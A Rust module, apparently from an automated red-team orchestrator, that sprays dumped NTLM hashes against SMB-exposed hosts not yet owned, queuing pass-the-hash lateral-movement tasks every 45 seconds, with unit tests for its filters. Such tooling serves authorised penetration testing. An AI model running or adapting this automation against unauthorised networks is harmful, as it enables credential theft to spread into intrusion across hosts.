//! auto_pth_spray -- pass-the-hash spray using dumped NTLM hashes.
//!
//! After secretsdump extracts NTLM hashes, this module sprays them across
//! hosts to find additional admin access. Uses netexec/crackmapexec with
//! NTLM hashes instead of passwords for lateral movement validation.
//!
//! This is distinct from credential_reuse (which tests passwords) and
//! secretsdump (which dumps from owned hosts). PTH spray tests hash-based
//! auth against non-owned hosts.

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{debug, info, warn};

use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::*;

/// Dispatches pass-the-hash spray against non-owned hosts using dumped NTLM hashes.
/// Interval: 45s.
pub async fn auto_pth_spray(dispatcher: Arc<Dispatcher>, mut shutdown: watch::Receiver<bool>) {
    let mut interval = tokio::time::interval(Duration::from_secs(45));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        if !dispatcher.is_technique_allowed("pth_spray") {
            continue;
        }

        let work: Vec<PthWork> = {
            let state = dispatcher.state.read().await;

            // Need NTLM hashes
            let ntlm_hashes: Vec<_> = state
                .hashes
                .iter()
                .filter(|h| {
                    h.hash_type.to_lowercase().contains("ntlm")
                        && !h.hash_value.is_empty()
                        && h.hash_value.len() == 32
                })
                .collect();

            if ntlm_hashes.is_empty() {
                continue;
            }

            let mut items = Vec::new();

            // For each non-owned host, try PTH with available NTLM hashes
            for host in &state.hosts {
                if host.owned {
                    continue;
                }

                // Check if host has SMB (port 445)
                let has_smb = host.services.iter().any(|s| {
                    let sl = s.to_lowercase();
                    sl.contains("445") || sl.contains("smb") || sl.contains("cifs")
                });
                if !has_smb {
                    continue;
                }

                // Try each unique NTLM hash against this host
                for hash in &ntlm_hashes {
                    let dedup_key = format!(
                        "pth:{}:{}:{}",
                        host.ip,
                        hash.username.to_lowercase(),
                        &hash.hash_value[..8]
                    );
                    if state.is_processed(DEDUP_PTH_SPRAY, &dedup_key) {
                        continue;
                    }

                    // Infer domain from hash or host
                    let domain = if !hash.domain.is_empty() {
                        hash.domain.clone()
                    } else {
                        host.hostname
                            .find('.')
                            .map(|i| host.hostname[i + 1..].to_string())
                            .unwrap_or_default()
                    };

                    items.push(PthWork {
                        dedup_key,
                        target_ip: host.ip.clone(),
                        hostname: host.hostname.clone(),
                        username: hash.username.clone(),
                        ntlm_hash: hash.hash_value.clone(),
                        domain,
                    });
                }
            }

            items
        };

        // Limit to 5 per cycle to avoid overwhelming the throttler
        for item in work.into_iter().take(5) {
            let payload = json!({
                "technique": "pass_the_hash",
                "target_ip": item.target_ip,
                "hostname": item.hostname,
                "username": item.username,
                "ntlm_hash": item.ntlm_hash,
                "domain": item.domain,
                "protocol": "smb",
            });

            let priority = dispatcher.effective_priority("pth_spray");
            match dispatcher
                .throttled_submit("lateral", "lateral", payload, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        host = %item.target_ip,
                        user = %item.username,
                        "PTH spray dispatched"
                    );
                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_PTH_SPRAY, item.dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_PTH_SPRAY, &item.dedup_key)
                        .await;
                }
                Ok(None) => {
                    debug!(host = %item.target_ip, "PTH spray deferred");
                }
                Err(e) => {
                    warn!(err = %e, host = %item.target_ip, "Failed to dispatch PTH spray");
                }
            }
        }
    }
}

struct PthWork {
    dedup_key: String,
    target_ip: String,
    hostname: String,
    username: String,
    ntlm_hash: String,
    domain: String,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn dedup_key_format() {
        let key = format!("pth:{}:{}:{}", "192.168.58.10", "admin", "aabbccdd");
        assert_eq!(key, "pth:192.168.58.10:admin:aabbccdd");
    }

    #[test]
    fn dedup_set_name() {
        assert_eq!(DEDUP_PTH_SPRAY, "pth_spray");
    }

    #[test]
    fn ntlm_hash_filter_valid() {
        let hash_type = "NTLM";
        let hash_value = "aad3b435b51404eeaad3b435b51404ee";
        assert!(hash_type.to_lowercase().contains("ntlm"));
        assert!(!hash_value.is_empty());
        assert_eq!(hash_value.len(), 32);
    }

    #[test]
    fn ntlm_hash_filter_rejects_short() {
        let hash_value = "abc123";
        assert_ne!(hash_value.len(), 32);
    }

    #[test]
    fn ntlm_hash_filter_rejects_empty() {
        let hash_value = "";
        assert!(hash_value.is_empty());
    }

    #[test]
    fn ntlm_hash_filter_rejects_non_ntlm() {
        let hash_type = "aes256-cts-hmac-sha1-96";
        assert!(!hash_type.to_lowercase().contains("ntlm"));
    }

    #[test]
    fn smb_service_detection() {
        let services = ["445/tcp microsoft-ds".to_string()];
        let has_smb = services.iter().any(|s| {
            let sl = s.to_lowercase();
            sl.contains("445") || sl.contains("smb") || sl.contains("cifs")
        });
        assert!(has_smb);
    }

    #[test]
    fn no_smb_service() {
        let services = ["80/tcp http".to_string()];
        let has_smb = services.iter().any(|s| {
            let sl = s.to_lowercase();
            sl.contains("445") || sl.contains("smb") || sl.contains("cifs")
        });
        assert!(!has_smb);
    }

    #[test]
    fn domain_from_hash_preferred() {
        let hash_domain = "contoso.local";
        let hostname = "srv01.fabrikam.local";
        let domain = if !hash_domain.is_empty() {
            hash_domain.to_string()
        } else {
            hostname
                .find('.')
                .map(|i| hostname[i + 1..].to_string())
                .unwrap_or_default()
        };
        assert_eq!(domain, "contoso.local");
    }

    #[test]
    fn domain_fallback_to_hostname() {
        let hash_domain = "";
        let hostname = "srv01.fabrikam.local";
        let domain = if !hash_domain.is_empty() {
            hash_domain.to_string()
        } else {
            hostname
                .find('.')
                .map(|i| hostname[i + 1..].to_string())
                .unwrap_or_default()
        };
        assert_eq!(domain, "fabrikam.local");
    }

    #[test]
    fn dedup_key_uses_hash_prefix() {
        let ip = "192.168.58.10";
        let username = "Admin";
        let hash_value = "aad3b435b51404eeaad3b435b51404ee";
        let dedup_key = format!(
            "pth:{}:{}:{}",
            ip,
            username.to_lowercase(),
            &hash_value[..8]
        );
        assert_eq!(dedup_key, "pth:192.168.58.10:admin:aad3b435");
    }
}
